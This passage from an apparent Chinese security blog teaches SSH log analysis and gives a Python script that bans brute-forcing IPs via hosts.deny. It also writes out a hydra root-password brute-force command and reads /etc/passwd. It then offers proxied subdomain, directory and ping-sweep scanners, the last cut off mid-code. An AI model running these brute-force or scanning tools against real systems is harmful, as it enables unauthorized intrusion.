class="hljs-keyword">subprocess.getoutput</span>执行命令，返回结果<br></code></pre></td></tr></table></figure><p>参数说明：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">subprocess.<span class="hljs-built_in">run</span>(args, *, <span class="hljs-attribute">stdin</span>=None, <span class="hljs-attribute">input</span>=None, <span class="hljs-attribute">stdout</span>=None, <span class="hljs-attribute">stderr</span>=None, <span class="hljs-attribute">shell</span>=<span class="hljs-literal">False</span>, <span class="hljs-attribute">timeout</span>=None, <span class="hljs-attribute">check</span>=<span class="hljs-literal">False</span>, <span class="hljs-attribute">universal_newlines</span>=<span class="hljs-literal">False</span>)<br><br>subprocess.call(args, *, <span class="hljs-attribute">stdin</span>=None, <span class="hljs-attribute">stdout</span>=None, <span class="hljs-attribute">stderr</span>=None, <span class="hljs-attribute">shell</span>=<span class="hljs-literal">False</span>, <span class="hljs-attribute">timeout</span>=None)<br><br>args：要执行的命令，必须是个字符串，字符串参数列表<br>stdin stdout stderr : 子进程的标准输入 输出 错误 最常用的是subprocess.PIPE<br>timeout : 设置命令超时<br>shell : 值为bool，如果参数为ture 将通过操作系统的shell执行命令<br></code></pre></td></tr></table></figure><img src="/img/image-20230905111931877.png" alt="image-20230905111931877" style="zoom:67%;" /><img src="/img/image-20230905112026716.png" alt="image-20230905112026716" style="zoom:67%;" /><img src="/img/image-20230905112414933.png" alt="image-20230905112414933" style="zoom:67%;" /><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">subprocess.Popen (它是上述几个方法的父类)<br><span class="hljs-built_in">process</span> = subprocess.Popen(<br>cmd,<br><span class="hljs-built_in">shell</span>=True,<br><span class="hljs-keyword">stdout</span> = subprocess.PIPE,<br><span class="hljs-keyword">stdin</span> = subprocess.PIPE,<br><span class="hljs-keyword">stderr</span> = subprocess.PIPE)<br><br><span class="hljs-built_in">shell</span>: 打开终端，Linux中是终端，Windows中是cmd<br><span class="hljs-keyword">stdout</span>=subprocess.PIPE:如果该命令执行成功，那么将该命令的标准输出放入管道<br><br>终端输入命令分两种：<br><span class="hljs-number">1.</span>直接在终端输入<br><span class="hljs-number">2.</span>进入环境再输入，比如python<br></code></pre></td></tr></table></figure><p>在shell中执行命令：</p><p><img src="/img/image-20230905141601763.png" alt="image-20230905141601763"></p><p>在python终端中执行命令：</p><p><img src="/img/image-20230905141623837.png" alt="image-20230905141623837"></p><p>命令联动：</p><p><img src="/img/image-20230905142517181.png" alt="image-20230905142517181"></p><p><img src="/img/image-20230905142454064.png" alt="image-20230905142454064"></p><h2 id="Linux日志分析"><a href="#Linux日志分析" class="headerlink" title="Linux日志分析"></a>Linux日志分析</h2><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/var/</span>log/cron     记录系统的定时任务<br><span class="hljs-regexp">/var/</span>log/cups     打印信息的日志<br><span class="hljs-regexp">/var/</span>log/message    记录的系统重要信息的日志<br><span class="hljs-regexp">/var/</span>log/btmp       登录失败<br><span class="hljs-regexp">/var/</span>log/lastlog     最后一次登录<br><span class="hljs-regexp">/var/</span>log/wtmp      成功登录记录<br><span class="hljs-regexp">/var/</span>log/secure     登录日志<br><span class="hljs-regexp">/var/</span>log/utmp      目前登录用户的信息<br><br>登录成功     Accepted password <span class="hljs-keyword">for</span> root <span class="hljs-keyword">from</span> <span class="hljs-number">172.30</span>.<span class="hljs-number">230.1</span> port <span class="hljs-number">59865</span> ssh2<br>登录失败     Failed password <span class="hljs-keyword">for</span> root <span class="hljs-keyword">from</span> <span class="hljs-number">172.30</span>.<span class="hljs-number">230.1</span> port <span class="hljs-number">59891</span> ssh2<br><br>常用命令：<br><span class="hljs-keyword">find</span>  <span class="hljs-keyword">grep</span>  awk  sed  cat  tail  head<br></code></pre></td></tr></table></figure><p>案例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">/etc/passwd从第10行开始显示5行<br><span class="hljs-built_in">cat</span> /etc/passwd | <span class="hljs-built_in">tail</span> -n +10 | <span class="hljs-built_in">head</span> -n 5<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230905145051484.png" alt="image-20230905145051484"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">只显示<span class="hljs-regexp">/etc/</span>passwd的账户名<br>cat <span class="hljs-regexp">/etc/</span>passwd | awk -F <span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span><br></code></pre></td></tr></table></figure><img src="/img/image-20230905145301828.png" alt="image-20230905145301828" style="zoom:67%;" /><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle">定位有多少个ip在爆破主机的root账户   从<span class="hljs-regexp">/var/</span>log/secure中分析<br>登录失败：<span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;Failed password for root&quot;</span> <span class="hljs-regexp">/var/</span>log/secure | awk <span class="hljs-string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="hljs-keyword">sort</span> | uniq -c | <span class="hljs-keyword">sort</span> -nr<br><br>登录成功：<span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;Accepted&quot;</span> <span class="hljs-regexp">/var/</span>log/secure | awk <span class="hljs-string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="hljs-keyword">sort</span> | uniq -c | <span class="hljs-keyword">sort</span> -nr<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230905150423999.png" alt="image-20230905150423999"></p><p><img src="/img/image-20230905150508377.png" alt="image-20230905150508377"></p><p><strong>封禁</strong></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">hosts黑名单          /etc/hosts.deny<br>hosts白名单          /etc/hosts.allow<br>配置格式：<br>服务:地址:允许/封禁<br>服务： <br>ssh  ftp  smb  telnet 关键字（all）：禁止或允许运行所有的服务<br>all:<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">0</span>.<span class="hljs-number">10</span>:deny(全封)<br>all:<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">0</span>.<span class="hljs-number">10</span>:allow(加白)<br><br>地址：<br><span class="hljs-number">192.168.0.10</span><br><span class="hljs-number">192.168.0.10</span>/<span class="hljs-number">24</span>（封C段）<br><span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">0</span>.*（封C段）<br><span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">0</span>. （封C段）<br></code></pre></td></tr></table></figure><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs diff">密码爆破 hydra<br>hydra -l root -P 密码字典.txt -vV -e ns 10.210.100.131 ssh<br><span class="hljs-deletion">-l 指定用户</span><br><span class="hljs-deletion">-L 指定用户字典</span><br><span class="hljs-deletion">-P 指定密码字典</span><br><span class="hljs-deletion">-vV 显示提示信息</span><br><span class="hljs-deletion">-e ns 允许为空密码</span><br>ip<br>爆破的服务<br></code></pre></td></tr></table></figure><img src="/img/image-20230905152954772.png" alt="image-20230905152954772" style="zoom:67%;" /><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">封禁：<br><span class="hljs-symbol">sshd:</span><span class="hljs-number">10.210</span><span class="hljs-number">.100</span><span class="hljs-number">.128</span>:deny<br></code></pre></td></tr></table></figure><img src="/img/image-20230905153708461.png" alt="image-20230905153708461" style="zoom:67%;" /><p>攻击机无法连接和爆破</p><img src="/img/image-20230905153851379.png" alt="image-20230905153851379" style="zoom:80%;" /><p><img src="/img/image-20230905153939709.png" alt="image-20230905153939709"></p><h2 id="项目实现思路"><a href="#项目实现思路" class="headerlink" title="项目实现思路"></a>项目实现思路</h2><p>1.打开安全日志</p><p>2.实时监控安全日志</p><p>3.解析日志每一行的内容，找出正在爆破的ip</p><p>4.设置一个阈值，超过阈值后，封禁ip 添加到hosts.deny中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment">#安全日志</span><br>logFile = <span class="hljs-string">&#x27;/var/log/secure&#x27;</span><br><span class="hljs-comment">#黑名单</span><br>hostDeny = <span class="hljs-string">&#x27;/etc/hosts.deny&#x27;</span><br><span class="hljs-comment">#封禁阈值</span><br>password_wrong_num = <span class="hljs-number">5</span><br><br><span class="hljs-comment">#获取已经加入黑名单的ip，转换为字典</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getDenies</span>():<br>    deniedDict = &#123;&#125;<br>    <span class="hljs-built_in">list</span> = <span class="hljs-built_in">open</span>(hostDeny).readlines()<br>    <span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>:<br>        group = re.search(<span class="hljs-string">r&#x27;(\d+\.\d+\.\d+\.\d+)&#x27;</span>,ip)<br>        <span class="hljs-keyword">if</span> group:<br>            deniedDict[group[<span class="hljs-number">1</span>]] = <span class="hljs-string">&#x27;1&#x27;</span>  <span class="hljs-comment">#标记该ip为1</span><br>    <span class="hljs-keyword">return</span> deniedDict<br><br><span class="hljs-comment">#监控方法</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">monitorLog</span>(<span class="hljs-params">Logfile</span>):<br>    <span class="hljs-comment">#统计密码错误的次数</span><br>    tempIp = &#123;&#125;<br>    <span class="hljs-comment">#已经存到黑名单中的ip</span><br>    deniedDict = getDenies()<br>    <span class="hljs-comment">#读取安全日志</span><br>    popen = subprocess.Popen(<span class="hljs-string">&#x27;tail -f &#x27;</span>+logFile,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-comment">#开始监控</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        time.sleep(<span class="hljs-number">0.1</span>)<br>        <span class="hljs-comment">#读取日志</span><br>        line = popen.stdout.readline().strip()  <span class="hljs-comment">#str.strip() 去除字符串两边的空格</span><br>        <span class="hljs-keyword">if</span> line:<br>            <span class="hljs-comment">#出现Failed 说明：这个用户存在，但是密码错误</span><br>            <span class="hljs-comment">#出现Invalid 说明：这个用户都不存在</span><br>            group = re.search(<span class="hljs-string">&#x27;Invalid user \w+ from (\d+\.\d+\.\d+\.\d+)&#x27;</span>,<span class="hljs-built_in">str</span>(line))<br>            <span class="hljs-comment">#不存在用户直接封</span><br>            <span class="hljs-keyword">if</span> group <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> deniedDict.get(group[<span class="hljs-number">1</span>]):<br>                subprocess.getoutput(<span class="hljs-string">&#x27;echo \&#x27;sshd:&#123;&#125;\&#x27; &gt;&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(group[<span class="hljs-number">1</span>],hostDeny))<br>                deniedDict[group[<span class="hljs-number">1</span>]] = <span class="hljs-string">&#x27;1&#x27;</span><br>                time_str = time.strftime(<span class="hljs-string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>,time.localtime(time.time()))<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#123;&#125; --- and ip:&#123;&#125; to hosts.deny for invalid usr&#x27;</span>.<span class="hljs-built_in">format</span>(time_str,group[<span class="hljs-number">1</span>]))<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-comment">#用户名合法 （存在该用户） 密码错误</span><br>            group = re.search(<span class="hljs-string">&#x27;Failed password for \w+ from (\d+\.\d+\.\d+\.\d+)&#x27;</span>,<span class="hljs-built_in">str</span>(line))<br>            <span class="hljs-keyword">if</span> group:<br>                ip = group[<span class="hljs-number">1</span>]<br>                <span class="hljs-comment">#统计ip错误的次数</span><br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> tempIp.get(ip):<br>                    tempIp[ip] = <span class="hljs-number">1</span><br>                <span class="hljs-keyword">else</span>:<br>                    tempIp[ip] = tempIp[ip]+<span class="hljs-number">1</span><br>                <span class="hljs-comment">#如果错误次数大于阈值，封禁该ip</span><br>                <span class="hljs-keyword">if</span> tempIp[ip] &gt; password_wrong_num <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> deniedDict.get(ip):<br>                    <span class="hljs-keyword">del</span> tempIp[ip]<br>                    subprocess.getoutput(<span class="hljs-string">&#x27;echo \&#x27;sshd:&#123;&#125;\&#x27; &gt;&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(ip,hostDeny))<br>                    deniedDict[ip]=<span class="hljs-string">&#x27;1&#x27;</span><br>                    time_str = time.strftime(<span class="hljs-string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>,time.localtime(time.time()))<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#123;&#125; --- and ip:&#123;&#125; to hosts.deny for invalid password&#x27;</span>.<span class="hljs-built_in">format</span>(time_str,group[<span class="hljs-number">1</span>]))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    monitorLog(logFile)<br></code></pre></td></tr></table></figure><p>其中group[1]即匹配到的ip</p><img src="/img/image-20230929155319929.png" alt="image-20230929155319929" style="zoom:67%;" /><p>靶机启动脚本：</p><p><img src="/img/image-20230905170317267.png" alt="image-20230905170317267"></p><p>攻击机执行爆破：</p><p><img src="/img/image-20230905170308672.png" alt="image-20230905170308672"></p><p><img src="/img/image-20230929160659881.png" alt="image-20230929160659881"></p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>pythonScript</title>
    <link href="/2023/09/22/pythonScript/"/>
    <url>/2023/09/22/pythonScript/</url>
    
    <content type="html"><![CDATA[<h1 id="pythonScript"><a href="#pythonScript" class="headerlink" title="pythonScript"></a>pythonScript</h1><p>菜鸡学习记录一下不同场景下的简单python脚本的编写 后续会继续优化 </p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>文章中所有内容仅供学习交流，不得用于其他任何目的，文中敏感内容已做脱敏处理，严禁用于商业和非法用途，否则由此产生的一切后果与作者无关</p><h2 id="子域名扫描器"><a href="#子域名扫描器" class="headerlink" title="子域名扫描器"></a>子域名扫描器</h2><p>思路：1.拼接子域名  2.观察返回包是否为200</p><p>代理配置：<a href="https://www.kuaidaili.com/">https://www.kuaidaili.com/</a></p><p>爆破字典：<a href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># 代理隧道域名:端口号  </span><br>tunnel = <span class="hljs-string">&quot;host:port&quot;</span><br><br><span class="hljs-comment"># 快代理使用用户名密码方式</span><br>username = <span class="hljs-string">&quot;xxx&quot;</span><br>password = <span class="hljs-string">&quot;xxx&quot;</span><br>proxies = &#123;<br>    <span class="hljs-string">&quot;http&quot;</span>: <span class="hljs-string">&quot;http://%(user)s:%(pwd)s@%(proxy)s/&quot;</span> % &#123;<span class="hljs-string">&quot;user&quot;</span>: username, <span class="hljs-string">&quot;pwd&quot;</span>: password, <span class="hljs-string">&quot;proxy&quot;</span>: tunnel&#125;,<br>    <span class="hljs-string">&quot;https&quot;</span>: <span class="hljs-string">&quot;http://%(user)s:%(pwd)s@%(proxy)s/&quot;</span> % &#123;<span class="hljs-string">&quot;user&quot;</span>: username, <span class="hljs-string">&quot;pwd&quot;</span>: password, <span class="hljs-string">&quot;proxy&quot;</span>: tunnel&#125;<br>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">domain_scan</span>(<span class="hljs-params">domain_name,sub_names</span>):<br>    <span class="hljs-keyword">for</span> sub <span class="hljs-keyword">in</span> sub_names:<br>        headers = &#123;<br>            <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; hu; rv:1.8.0.11) Gecko/20070312 Firefox/1.5.0.11&quot;</span>,<br>        &#125;<br>        url = <span class="hljs-string">f&quot;https://<span class="hljs-subst">&#123;sub&#125;</span>.<span class="hljs-subst">&#123;domain_name&#125;</span>&quot;</span><br>        <span class="hljs-keyword">try</span>:<br>            requests.head = headers<br>            <span class="hljs-comment">#挂上代理</span><br>            requests.get(url,proxies=proxies)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*]<span class="hljs-subst">&#123;url&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">except</span> requests.ConnectionError:<br>            <span class="hljs-comment">#print(&quot;error&quot;)</span><br>            <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    dom_name = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;please enter the domain name:&quot;</span>)<br><br>    <span class="hljs-comment">#子域名文件路径 </span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/xxx/xxx/subdomain.txt&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        sub_name = file.read()<br>        sub_dom = sub_name.splitlines()<br>        <span class="hljs-comment"># print(&quot;文件中存在的子域名数量：&#123;&#125;&quot;.format(len(sub_dom)))</span><br>        <span class="hljs-comment"># print(&quot;文件子域名列表&quot;)</span><br>        <span class="hljs-comment"># print(sub_dom)</span><br>        <br>    domain_scan(dom_name,sub_dom)<br></code></pre></td></tr></table></figure><h2 id="目录扫描器"><a href="#目录扫描器" class="headerlink" title="目录扫描器"></a>目录扫描器</h2><p>原理：1.拼接路径并请求   2.获取status_code，200则为成功 存在此目录</p><p>优化：加入面向对象 、多线程 、fake_useragent模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Queue<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">from</span> collections.abc <span class="hljs-keyword">import</span> <span class="hljs-type">Callable</span>,Iterable,Mapping<br><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Any</span><br><span class="hljs-keyword">from</span> fake_useragent <span class="hljs-keyword">import</span> UserAgent<br><span class="hljs-comment">#使用fake_useragent包导入随机UA头</span><br>random_UA = UserAgent()<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">DirScan</span>(threading.Thread):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,queue</span>):<br>        threading.Thread.__init__(self)<br>        self.queue = queue<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment">#获取队列中的url</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> self.queue.empty():<br>            url = self.queue.get()<br>            <br>            <span class="hljs-keyword">try</span>:<br>                headers = &#123;<br>                    <span class="hljs-string">&quot;User-Agent&quot;</span>:random_UA.random<br>                &#125;<br>                r = requests.get(url=url,headers=headers,timeout=<span class="hljs-number">2</span>)<br>                <span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">200</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] %s&#x27;</span> % url)<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-comment">#print(&quot;没有此路径&quot;)</span><br>                    <span class="hljs-keyword">pass</span><br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>(<span class="hljs-params">url,ext,count</span>):<br>    <span class="hljs-comment">#将待拼接的路径传入队列</span><br>    queue = Queue()<br>    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;%s.txt&#x27;</span> % ext,<span class="hljs-string">&#x27;r&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f:<br>        queue.put(url+i.rstrip(<span class="hljs-string">&#x27;\n&#x27;</span>))    <br>    <br>    <span class="hljs-comment">#多线程</span><br>    threads = []<br>    thread_count = <span class="hljs-built_in">int</span>(count)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(thread_count):<br>        threads.append(DirScan(queue))<br>    <br>    <span class="hljs-comment">#开启线程</span><br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>        t.start()<br>    <br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>        t.join()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    url = <span class="hljs-string">&#x27;https://www.baidu.com&#x27;</span><br>    ext = <span class="hljs-string">&#x27;xxx&#x27;</span><br>    count = <span class="hljs-number">16</span><br>    start(url,ext,count)<br><br></code></pre></td></tr></table></figure><h2 id="C段扫描器"><a href="#C段扫描器" class="headerlink" title="C段扫描器"></a>C段扫描器</h2><p>原理：执行ping命令 是否有回显</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Queue<br><span class="hljs-keyword">from</span> subprocess <span class="hljs-keyword">import</span> Popen,PIPE<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CScan</span>(threading.Thread):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,queue</span>):<br>        threading.Thread.__init__(self)<br>        self.queue = queue<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br><br>        <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> self.queue.empty():<br>            ip = self.queue.get()<br><br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-comment">#执行ping命令</span><br>                check_ping = Popen(<span class="hljs-string">&quot;ping &#123;0&#125; \n&quot;</span>.<span class="hljs-built_in">format</span>(ip),stdin=PIPE,stdout=PIPE,shell=<span class="hljs-literal">True</span>)<br>                data = check_ping.stdout.read()<br>                <span class="hljs-comment">#数据要转为str</span><br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;TTL&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(data):<br>                    <span class="hljs-built_in">print</span>(ip+<span class="hljs-string">&quot; id up!\n&quot;</span>)<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span>(ip+<span class="hljs-string">&quot; 不在线 \n&quot;</span>)<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-keyword">pass</span><br><span class="hljs-comment">#多线程</span><br><span 